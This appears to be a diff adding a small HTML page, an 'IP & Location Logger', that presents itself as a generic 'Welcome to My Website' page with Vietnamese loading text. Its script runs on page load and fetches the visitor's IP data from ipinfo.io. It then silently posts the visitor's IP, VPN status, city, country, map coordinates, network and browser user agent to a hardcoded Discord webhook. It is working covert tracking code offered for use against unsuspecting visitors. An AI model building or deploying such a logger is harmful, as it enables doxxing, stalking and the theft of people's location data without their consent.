@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP & Location Logger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        .ip-address {
+            font-size: 3em;
+            font-weight: bold;
+            color: #ff0000;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Welcome to My Website</h1>
+        <p>Đang tải dữ liệu mạng và vị trí...</p>
+        <div class="ip-address" id="ip-address">...</div>
+        <p id="status">Vui lòng đợi trong giây lát...</p>
+    </div>
+    
+    <script>
+    function monke(json) {
+        document.getElementById('ip-address').innerText = json.ip;
+        document.getElementById('status').innerText = "Tải thành công!";
+
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
+        request.setRequestHeader('Content-type', 'application/json');
+
+        // Kiểm tra VPN/Proxy
+        let isVpnOrProxy = "NO";
+        if (json.privacy) {
+            if (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting) {
+                isVpnOrProxy = "YES (VPN/Proxy detected)";
+            }
+        }
+
+        let mapsLink = json.loc ? `https://www.google.com/maps?q=${json.loc}` : 'Không có tọa độ';
+
+        var params = {
+            username: "Cordly Image Logger by phongdepzai02",
+            content: "🚀 Đã có người truy cập!",
+            embeds: [
+                {
+                    title: "📍 Thông tin Vị trí & IP",
+                    color: 3447003,
+                    fields: [
+                        { name: "🔹 IP Address", value: `\`${json.ip || 'N/A'}\``, inline: false },
+                        { name: "🛡️ VPN/Proxy", value: `🚩 **${isVpnOrProxy}**`, inline: false },
+                        { name: "🌍 Timezone", value: `${json.timezone || 'N/A'}`, inline: false },
+                        { name: "🔹 Địa điểm (IP Geolocation)", value: `**Quốc gia:** \`${json.country || 'N/A'}\`\n**Thành phố:** \`${json.city || 'N/A'}\``, inline: false },
+                        { name: "🗺️ Google Maps (Tọa độ IP)", value: `[Bấm vào đây để xem bản đồ](${mapsLink})\n*Tọa độ: ${json.loc || 'N/A'}*`, inline: false },
+                        { name: "🏢 Network / Hostname", value: `${json.org || 'N/A'}`, inline: false },
+                        { name: "🔹 Thiết bị", value: `\`${navigator.userAgent}\``, inline: false }
+                    ],
+                    footer: {
+                        text: "Tool created by phongdepzai02"
+                    }
+                }
+            ]
+        };
+
+        request.send(JSON.stringify(params));
+    }
+    </script>
+
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+</body>
+</html>
